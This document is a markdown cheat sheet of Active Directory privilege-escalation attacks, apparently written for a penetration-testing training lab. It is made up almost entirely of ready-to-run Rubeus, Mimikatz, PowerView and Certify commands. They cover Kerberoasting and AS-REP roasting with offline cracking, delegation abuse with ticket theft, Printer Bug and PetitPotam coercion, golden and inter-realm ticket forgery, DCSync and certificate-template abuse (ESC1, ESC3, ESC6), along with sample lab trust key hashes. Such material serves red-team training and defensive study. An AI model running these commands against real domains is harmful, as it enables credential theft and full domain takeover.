## AD Privilege Escalation

- [Kerberoasting](#kerberoasting)
  * [Using `Rubeus.exe`](#using--rubeusexe-)
  * [Using Mimikatz](#using-mimikatz)
- [Targeted Kerberoasting AS-REPs](#targeted-kerberoasting-as-reps)
  * [Enumerating accounts with Kerberos Preauth disabled](#enumerating-accounts-with-kerberos-preauth-disabled)
  * [Disable Kerberos Preauth](#disable-kerberos-preauth)
  * [ASREPRoast](#asreproast)
  * [Rubeus](#rubeus)
- [Targeted Kerberoasting Set SPN](#targeted-kerberoasting-set-spn)
- [Uncostrained Delegation](#uncostrained-delegation)
    + [Printer Bug](#printer-bug)
- [Constrained Delegation](#constrained-delegation)
  * [Resource Based RBCD](#resource-based-rbcd)
- [DNSAdmins](#dnsadmins)
- [Escalate Across Trusts](#escalate-across-trusts)
  * [Child to Parent using sIDHistory](#child-to-parent-using-sidhistory)
  * [Child to Parent Using krbtgt Hash](#child-to-parent-using-krbtgt-hash)
  * [Across Forest Using Trust Tickets](#across-forest-using-trust-tickets)
- [Across Domain Trusts AD Certificate Services](#across-domain-trusts-ad-certificate-services)
  * [ESC1](#esc1)
  * [ESC3](#esc3)
  * [ESC6](#esc6)

### Kerberoasting
---
Any domain user can request copies of all service accounts with their password hashes. This way a TGS can be requested for any SPN bound to a user for later cracking user password offline. 
- PowerView:
```powershell
# Standard AD User. Get Domain Users SPN. Users that are for services
C:> . .\PowerView.ps1
C:> Get-DomainUser -SPN
# We require to use the 'serviceprincipalname'

# Get every available SPN account, request a TGS and dump its hash
C:> Invoke-Kerberoast

# Request TGS for a single account
C:> Request-SPNTicket

# Export all tickets
C:> Invoke-Mimikatz -Command '"kerberos::list /export"'
```
- AD Module
```powershell
C:> Get-ADUser -Filter {ServicePrincipalName ne ""$null ""} -Properties ServicePrincipalName
```
#### Using `Rubeus.exe`
```powershell
# Get kerberos stats
C:> Rubeus.exe /stats

# Use Rubeus to request a TGS for <user>
C:> Rubeus.exe kerberoast /user:<user> /simple /outfile:hashes.txt

# Accounts supporting only RC4 (Gives errors!)
C:> Rubeus.exe kerberoast /stats /rc4opsec
C:> Rubeus.exe kerberoast /user:<user> /simple /rc4opsec

# Accounts supporting only AES for Domain
C:> Rubeus.exe kerberoast /outfile:<fileName> /domain:<domain> /aes

# Specifying the authentication credentials 
C:> Rubeus.exe kerberoast /outfile:<fileName> /domain:<domain> /creduser:<user> /credpassword:<pass>

# Kerberoast all possible accounts
C:> Rubeus.exe kerberoast /outfile:hashes.txt                  

# Crack with John. Adequate file before cracking
C:> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```
#### Using Mimikatz
```powershell
C:> Add-Type -AssemblyNAme System.IdentityModel

C:> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken 
    -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"

# Dump account hashes to a `.kirbi` files: asd@service_asdasd
C:> . .\Invoke-Mimikatz.ps1
C:> Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack using `tgsrepcrack.py`
C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>.kirbi
```
### Targeted Kerberoasting AS-REPs
---
For a domain user with kerberos preauthentication disabled, a valid TGT for the account can be requested without even having domain credentials. Then bruteforce the encripted passwd in the TGT.
#### Enumerating accounts with Kerberos Preauth disabled
```powershell
# PowerView
C:> Get-DomainUser -PreauthNotRequired -Verbose    

# AD Module
C:> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
#### Disable Kerberos Preauth
```powershell
# Disable it
C:> Set-DomainObject -Identity <user> -XOR @{useraccountcontrol=4194304} -Verbose

# Check again
C:> Get-DomainUser -PreauthNotRequired -Verbose  
``` 
#### ASREPRoast 
```powershell
# Enumerate Users with Kerberos preauth disabled
C:> Invoke-ASREPRoast -Verbose

# Request Encrypted AS-REP for Offline Brute Force
C:> Get-ASREPHash -UserName <user> -Verbose

# Crack using JTR
C:> john.exe --wordlist=C:\10k-worst-pass.txt C:\asrephashes.txt
```
#### Rubeus
```powershell
# Roast all domain users
Rubeus.exe asreproast /format:<john or hashcat> /domain:<domain> /outfile:<file>

# Specific user
Rubeus.exe asreproast /user:<user> /format:<john or hashcat> /domain:<domain> /outfile:<file>

# Users from a OU
Rubeus.exe asreproast /ou:<OU_name> /format:<john or hashcat> /domain:<domain> /outfile:<file>
```
### Targeted Kerberoasting Set SPN
---
With rights over a user, we can set a SPN to it, and then go for a AS-REPs attack.
```powershell
# Enumerate permissions for <group>
C:> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<group>"}

# Check if user already has a SPN
C:> Get-DomainUser -Identity <user> | select serviceprincipalname

# Set SPN for the user
C:> Set-DomainObject -Identity <user> | Set @{serviceprincipalname='ops/whatever1'}

# Kerberoast the user with Rubeus
C:> Rubeus.exe kerberoast /outfile:targetedhashes.txt
C:> john.exe /wordlist=C:\wordlist.txt C:\targetedhashes.txt
```

### Uncostrained Delegation
---
With DA access to a host with Unconstrained Delegation enabled, when some user connects, the user TGT can be taken to be able to impersonate passig the ticket (ptt).
```powershell
# Find Server with Unconstraided Delegation Enabled
C:> . C:\AD\Tools\PowerView.ps1
C:> Get-DomainComputer -Unconstrained | select -ExpandProperty name

# Monitor incoming sessions on host
C:> Invoke-UserHunter -ComputerName <host> -Poll <seconds> -UserName <user> -Delay <interval> -Verbose

# Compromise the server and wait uuser to connect to server and then dump tokens on .kirbi files
C:> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Reuse the exported ticket with PTT
C:> Invoke-Mimikatz -Command '"kerberos::ptt C:<ticket_file_name>.kirbi"'
```
- Requisite for elevation using this technique, is to compromise a user with Admin Rights on the host

#### Printer Bug
```powershell
# Need shell in the server to compromise
# Launch Rubeus listener to capture TGT from DC 
C:> Rubeus.exe monitor /targetuser:<dc-name>$ /interval:5 /nowrap

# From a shell on our host, force DC auth to the server to compromise
C:> MS-RPRN.exe \\<DC_fqdn_name> \\<server_to_compromise_fqdn>
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.     # This error is OK

# PetiPoam can be user as well. Does the same.
# USefull when no print spooler enabled
C:> PetitPotam.exe dcorp-appsrv dcorp-dc

# At this point, in Rubeus we got the TGT for DC auth.
# Copy the Base64EncodedTicket and use with Rubeus in a elevated shell from our host
C:> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
[*] Action: Import Ticket
[+] Ticket successfully imported!

# At this point we get a ticket for the DC User
# From here, a DC-Sync attack to DC to get krbtgt and also to enterprise DC.
```
### Constrained Delegation
---
With have GenericALL/GenericWrite privileges on a machine account object of a domain, it can be abused, and then impersonate ourselves as any user of the domain to the machine.
- `msdn-allowedtodelegate`: services that can be abused for impersonation.
```powershell
# Get users with Constraied delegation
C:> . .\PowerView.ps1
C:> Get-DomainUser -TrustedToAuth
#    msds-allowedtodelegateto : {CIFS/host.domain.LOCAL, CIFS/host}    <-- Service to abuse
#    useraccountcontrol       : TRUSTED_TO_AUTH_FOR_DELEGATION         <-- User is trusted 
#    samaccountname            : websvc                                <-- user name

# Request a TGS for user as Domain Administrator for CIFS on host. The user that has constrained
# delegation can request the ticket to impersonate Admin user (f.ex.). We get a ticket in this example
# to impersonate user Administrator on <host> for shared files (CIFS)
C:> Rubeus.exe s4u r:<user> /aes256:<user_aes_hash> /impersonateuser:Administrator 
                   /msdsspn:"CIFS/<host_fqdn>" /ptt
```
```powershell
# Get Computer Accounts with Constrained Delegation
C:> Get-DomainComputer -TrustedToAuth

# Pass the ticket to impersonate User Administrator using the host account
#   Using LDAP as the altservice, will allow to do a dcsync to dump krbgtg hash
C:> Rubeus.exe s4u /user:<host_account>$ /aes256:<host_aes_hash> /impersonateuser:Administrator 
                   /msdsspn:time/<host_Fqdn> /altservice:<SPN: http|host|ldap|...> /ptt
```
#### Resource Based RBCD
Required control over an object which has SPN configured, write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity required. 
With required privileges on a computer object, it can be abused and impersonate ourselves as any user of the domain to it.
1. Check if User has Write Permissions over a machine
2. Check machines for RCBD enabled
3. Check if user from step 1 has Write access to machine in 2
4. Add our machine as delegated for machine 1
5. Get hash of our machine
6. Impersonate user using our machine hash 
```powershell
# Use BloodHound to get Users permissions over hosts for clues

# Then check potential users with following command
C:> Find-InterestingDomainACL | ?{$_.identityreferencename -match '<user>'}
#   ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
#   ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
#   SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1109
#   IdentityReferenceName   : ciadmin
# Also can check for everything to enumerate all and then check previous command
C:>  Find-InterestingDomainAcl | select identityreferencename,identityreferenceclass,activedirectoryrights

# Check for RCBD enabled machines
C:> Get-DomainRBCD

# Set RCBD on <host> for the "machines". Interesting to make our machine a delegatefrom
C:> Set-DomainRBCD -Identity <host> -DelegateFrom 'machine1$|machine2$|machine3$' -Verbose
# Listing again the RBCD machines will show outs in the DelegatedName

# Get Keys for machine1, our own machine, as rcbd was configured before
C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys" "exit"'
# Check the SID: S-1-5-18 to know which has to pick

# Abuse RBCD to access <host> as domain admin
C:> Rubeus.exe s4u /user:machine1$ /aes256:<machine1_hash> /msdsspn:http/<host> /impersonateuser:administrator /ptt
```
### DNSAdmins
---
```
[NAH]
```
Not Worth the Effort.

### Escalate Across Trusts
---
#### Child to Parent using sIDHistory
If we manage to compromise a child domain of a forest and SID filtering isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the SID History field on a kerberos TGT ticket, that defines the "extra" security groups and privileges.
```powershell
#`sIDHistory` (sids below) is a user attribute designed for scenarios where a user is moved from one domain to another. 
# When a user's domain is changed, they get a new SID and the old SID is added to `sIDHistory`
# AD permissions required. Get a cmd on a DA using rubeus or mimikatz

# Get Domain Trust Key in any of following ways. Need DA on DC
C:> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <dc-host>
C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<parent-dc>$
C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-1874506631-3219952063-538504511)   <-- Need This for sid

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)           <-- Need This for SIDS
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
   [[BLAH BLAH]]
        * aes256_hmac       7db7b5f208df1b004304bc02df21dc145147b5f093a97aef79170dd1befdaf30
        * aes128_hmac       d979ad3c525592356d62b641907e46cd
        * rc4_hmac_nt       c4451dea556c1cdf20bd737ce7416d63                       <-- Need This for rc4

# On attacket machine, with elevated shell, Create Inter Realm TGT on attacker machine. '/sids' is the sidhistory
C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<child_domain_fqdn> /sid:<domain_sid> 
                              /sids:<parent_domain_sid>-519 /rc4:<rc4_hmac_nt> /service:krbtgt 
                              /target:<target_domain_fqdn> /ticket:C:\trust_tkt.kirbi"'

# Create a TGS using the created ticket
C:> Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:<target_domain_dc> /ptt
# Here we get access to CIFS only
```
#### Child to Parent Using krbtgt Hash
```powershell
# With the krbtgt hash for child domain, create a inter realm TGT and inject in the process
C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<child_domain> /sid:<child_Domain_sid> 
                               /sids:<target_domain_sid>-519 /krbtgt:<child_domain_krbtgt_hash> /ptt" "exit"'

# Extract secrets from parent domain
C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parent_domain>\krbtgt /domain:<parent_Domain_fqdn>" "exit"'
```
#### Across Forest Using Trust Tickets
- Only access to explicit resources. In this case to shared folder using CIFS
```powershell
# Get Domain Trust Key in any of following ways. Need DA rights on DC.
C:> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <dc-host>
C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

[[BLAH]]
Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)    <-- Need This
 [ In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL 
[[BLAH BLAH]]
     * aes256_hmac f28a97c2037127a89ddcc2f2562232e9395c90e418914d0b4534870bb6726eee 
     * aes128_hmac 378202beaecc67b02d855f77d5d3ba82 
     * rc4_hmac_nt 7a9c598fa3232fa3d59f379c917d56ba                          <-- Need This
[[BLAH BLAH]]

# Create Inter Forest TGT in attacker machine. Save to file
C:> C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain_fqdn> /sid:<domain_sid> 
                              /rc4:<rc4_hmac_nt> /service:krbtgt /target:<target_domain_fqdn> /ticket:C:\trust_tkt.kirbi"'

# Create a TGS using the created ticket
C:> Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/eurocorp-dc.moneycorp.local /dc:<target_domain_dc> /ptt
```
### AD Certificate Services
---
Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.

This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA") and use the captured certificate with Rubeus to forge authentication.

Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target.
```powershell
# Enumerate AD CS in the target forest
C:> Certify.exe cas

# Enumerate Templatesa
C:> Certify.exe find
# Interesting Fields on Result
#      CA Name: Usefull for ESC1
#      TemplateName: The name itself :-)
#      Permissions
#          Enrollment Rights: Grups or User with rights. This ones canrequest certificates for any
#          Owner, WriteOwner Principals, etc...
#      msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT

# Enumerate Vulnerable Tmeplates
C:> Certify.exe find /vulnerable
```
#### ESC1
```powershell
# Generating a certificate for any user, it's possible to request TGT on behalf
#  of the user the cert been generated

# List templates with msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
C:> Certify.exe find /enrolleeSuppliesSubject

# Request certificate for Domain Admin (PEM format)
C:> Certify.exe request /ca:<CA_name> /template:"<template_name>" /altname:administrator
# Prints the cert, need to save it on file. Copy text between:
#       -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE-----

# Convert from PEM to PFX. Using openssl
C:> openssl.exe pkcs12 -in <pem_file.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
                       -export -out <out_file.pfx>

# Use Rubeus to request TGT for DA Admin
C:> Rubeus.exe asktgt /user:administrator /certificate:<exported_certificate>.pfx 
                      /password:<export_password_put_before> /ptt
                  
# Got privileges
C:> winrs -r:dcorp-dc whoami
```

#### ESC3
```powershell
# Some Templates have policies to allow other Templates to generate certificates
#  By this technique can generate a cert for a user using a certificate

# Enumerate vulnerable templates 
C:> Certify.exe find /vulnerable
# Interesting to see pkiextendedkeyusage : Certificate Request Agent

# Need to find another template with EKU that allows for domain autentication and application
#  of certificate request agent. Then can request certificate as any user. Like ESC1
C:> Certify.exe find
# Search for the one with 'Application Policies : Certificate Request Agent'

# Request an enrollment agent certificate from first template and save to file
C:> Certify.exe request /ca:<CA_name> /template:SmartCardEnrollment-Agent

# Convert to PFX
C:> openssl.exe pkcs12 -in <file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
                -export -out <out_file>.pfx

# Request a certificate for DA from the second cert found using the generated one
C:> Certify.exe request /ca:<CA_name> /template:SmartCardEnrollment-Users /onbehalfof:<domain>\administrator 
                        /enrollcert:esc3-agent.pfx /enrollcertpw:<password>

# Convert to PFX
C:> openssl.exe pkcs12 -in <in_file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
                -export -out <out_file>.pfx

# Request TGT aS DOMAIN ADMIN
c:> Rubeus.exe asktgt /user:administrator /certificate:<OUT_fILE_PREVIOUS_STEP>.pfx 
                      /password:<pass_previous_step> /ptt
```

#### ESC6
```powershell
# Check if the CA has EDITF_ATTRIBUTESUBJECTALTNAME2. This means that we can request a certificate for ANY user 
#   from a template that allow enrollment for normal or low privileged users.
C:> Certify.exe cas
#  Find this ->> [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!

# Find template where we have rights for enrollment
C:> Certify.exe find
#  Find this ->> Enrollment Rights : dcorp\<group or user> S-1-5-21-1874506631-3219952063-538504511-1116
#            ->>  msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
C:> Certify.exe find /clientauth  <-- Can get the same

# Request certificate for alternate DA
C:> Certify.exe request /ca:<CA_name> /template:"<template_name>" /altname:administrator

# Convert to PFX
C:> openssl.exe pkcs12 -in <in_file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
                -export -out <out_file>.pfx

# Request TGT aS DOMAIN ADMIN
c:> Rubeus.exe asktgt /user:administrator /certificate:<out_file_PREVIOUS_STEP>.pfx 
                      /password:<pass_previous_step> /ptt
```
